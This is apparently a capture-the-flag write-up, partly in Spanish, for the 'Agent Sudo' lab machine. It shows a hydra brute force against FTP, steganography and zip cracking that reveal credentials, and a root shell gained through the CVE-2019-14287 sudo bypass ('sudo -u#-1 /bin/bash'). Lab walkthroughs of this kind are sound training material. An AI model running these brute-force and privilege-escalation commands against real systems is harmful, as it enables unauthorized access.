# Agent Sudo
## Initial Scan
```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement

```
## Enum
### HTTP
```
 Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```
Suponiendo que cada agente use la letra como nombre en clave tendriamos que ir testeando usuarios de la A a la Z a ver con cual tenemos acceso

Con el agente C tenemos lo siguiente
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```
Sabiendo que chris tiene una contraseña debil probamos en el ftp de la máquina a ver si podemos acceder
```
$ hydra -l chris -P /home/pj/rockyou.txt ftp://10.10.51.149
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-26 15:03:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
[DATA] attacking ftp://10.10.51.149:21/
[STATUS] 124.00 tries/min, 124 tries in 00:01h, 14344277 to do in 1927:60h, 16 active
[21][ftp] host: 10.10.51.149   login: chris   password: crystal
```
### FTP
```
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
``` 
#### To agent J
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
Con binwalk podemos ver un zip , sacamos el hash del archivo para john con zip2john y despues lo crackeamos usando john
```
alien            (8702.zip/To_agentR.txt)
```
La nota pone lo siguiente
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
Es el base64 de Area51, antes mirando las fotos note que una de ellas tenia las strings que deja Steghide en las imagenes , veamos si puedo extaer un archivo con esa clave
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
Con esto ya podemos logearnos como james ia SSH
## Privesc 
```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
Viendo que tenemos la restrincion de (ALL, !root) probamos el CVE 2019-14287
```
sudo -u#-1 /bin/bash
```
Y ya tenemos shell como root

## Analisís de la intrusion
Es muy CTF para hacer un analisís mas allá del propio CVE y la politica de contraseñas
###  CVE 2019-14287
Este CVE permite abusar de una restrincion hecha precisamente para evitar escalr privilegios, para lograr escalr privilegiso de forma efectiva
